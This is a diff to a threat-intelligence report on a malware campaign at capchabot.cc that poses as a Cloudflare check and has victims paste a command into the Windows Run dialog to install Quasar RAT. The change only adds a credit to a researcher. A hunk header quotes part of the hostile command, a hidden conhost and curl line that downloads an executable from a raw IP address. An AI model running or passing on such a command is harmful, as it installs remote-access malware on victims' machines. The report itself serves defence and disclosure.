@@ -8,7 +8,7 @@
 
 ## Executive Summary
 
-A new malware distribution campaign masquerading as a **Cloudflare verification page** has been discovered at `capchabot.cc`. The site tricks users into pasting malicious code into the **Windows Run dialog**, which downloads and executes a **Quasar RAT** payload.
+A new malware distribution campaign masquerading as a **Cloudflare verification page** has been discovered at `capchabot.cc` (found by Enderman, https://youtube.com/@Endermanch). The site tricks users into pasting malicious code into the **Windows Run dialog**, which downloads and executes a **Quasar RAT** payload.
 
 Behavioral analysis and sandbox detonation confirm the payload installs a persistent, memory-injecting RAT with command-and-control (C2) communication. The campaign uses **stealthy execution techniques**, including `conhost.exe --headless`, to avoid user detection.
 
@@ -166,3 +166,4 @@ conhost.exe --headless cmd /c cd /D %userprofile% && curl -s -o a.exe http://213
 ## Attribution Notes
 
 This campaign is linked to the **Quasar Remote Access Trojan** — an open-source RAT used in both criminal and nation-state operations. It provides full remote access, persistence, credential theft, and keylogging capabilities. The campaign seen at `capchabot.cc` weaponizes social engineering and stealthy execution in a highly deceptive manner.
+
